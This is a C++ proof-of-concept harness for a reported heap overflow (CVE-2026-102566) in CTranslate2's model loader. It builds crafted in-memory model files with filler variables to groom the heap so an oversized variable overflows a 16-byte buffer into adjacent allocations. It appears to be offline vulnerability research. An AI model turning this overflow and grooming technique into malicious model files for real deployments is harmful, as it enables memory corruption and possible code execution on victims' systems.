// Grooming experiment for CVE-2026-102566: filler variables before the
// overflowing one, to test whether an earlier live allocation can sit after
// the 16-byte StorageView buffer at the instant of the model.cc:657 store.
// Offline only; no probe off loopback.
#include <cstdint>
#include <cstdlib>
#include <iostream>
#include <memory>
#include <sstream>
#include <string>

#include <nlohmann/json.hpp>

#include "ctranslate2/devices.h"
#include "ctranslate2/models/model.h"
#include "ctranslate2/models/model_factory.h"
#include "ctranslate2/models/model_reader.h"
#include "ctranslate2/storage_view.h"
#include "ctranslate2/types.h"
#include "ctranslate2/utils.h"

using namespace ctranslate2;
using namespace ctranslate2::models;

namespace {
  class MiniModel : public Model {
  public:
    std::unique_ptr<Model> clone() const override { return std::make_unique<MiniModel>(); }
  };

  struct Writer {
    std::string b;
    void u8(uint8_t v) { b.push_back(static_cast<char>(v)); }
    void u16(uint16_t v) { u8(v & 0xff); u8(v >> 8); }
    void u32(uint32_t v) { u8(v & 0xff); u8((v >> 8) & 0xff); u8((v >> 16) & 0xff); u8(v >> 24); }
    void str(const std::string& s) { u16(static_cast<uint16_t>(s.size() + 1)); b += s; u8(0); }
  };

  // Product 16, ranks 2/4/8 give distinct dimensions-array size classes while
  // the variable buffer stays 16 bytes (FLOAT32).
  void variable(Writer& w, const std::string& name, int rank, uint32_t num_bytes) {
    w.str(name);
    w.u8(static_cast<uint8_t>(rank));
    if (rank == 2) { w.u32(2); w.u32(2); }
    else if (rank == 4) { w.u32(1); w.u32(1); w.u32(4); w.u32(4); }
    else if (rank == 8) {
      for (int i = 0; i < 6; ++i) w.u32(1);
      w.u32(2); w.u32(8);
    }
    w.u8(static_cast<uint8_t>(DataType::FLOAT32));
    w.u32(num_bytes);
    for (uint32_t i = 0; i < num_bytes; ++i) w.u8(static_cast<uint8_t>('A' + (i % 26)));
  }

  std::string crafted_model(uint32_t overflow, int fillers, int name_len, int filler_rank) {
    Writer w;
    w.u32(6);
    w.str("Transformer");
    w.u32(1);
    w.u32(static_cast<uint32_t>(fillers + 2));
    for (int i = 0; i < fillers; ++i)
      variable(w, std::string(name_len, static_cast<char>('f' + (i % 20))), filler_rank, 16);
    variable(w, "origin", 2, overflow);
    variable(w, "victim", 2, 16);
    w.u32(0);
    return w.b;
  }

  class MemReader : public ModelReader {
  public:
    explicit MemReader(std::string model) : _model(std::move(model)) {}
    std::string get_model_id() const override { return "mem://groomed"; }
    std::unique_ptr<std::istream> get_file(const std::string& filename, const bool) override {
      if (filename == "model.bin") return std::make_unique<std::istringstream>(_model);
      return nullptr;
    }
  private:
    std::string _model;
  };
}

namespace ctranslate2 {
  namespace models {
    std::shared_ptr<Model> create_model(const std::string&) {
      return std::make_shared<MiniModel>();
    }
  }
  void log_system_config() {}
}

int main(int argc, char** argv) {
  const uint32_t n = argc > 1 ? static_cast<uint32_t>(std::strtoul(argv[1], nullptr, 10)) : 17;
  const int fillers = argc > 2 ? std::atoi(argv[2]) : 0;
  const int name_len = argc > 3 ? std::atoi(argv[3]) : 6;
  const int rank = argc > 4 ? std::atoi(argv[4]) : 2;
  MemReader reader(crafted_model(n, fillers, name_len, rank));
  std::cout << "CT2 groom: overflow=" << n << " fillers=" << fillers
            << " name_len=" << name_len << " rank=" << rank << std::endl;
  auto model = Model::load(reader, Device::CPU, 0);
  std::cout << "load returned; variables=" << model->get_variables().size() << std::endl;
  return 0;
}
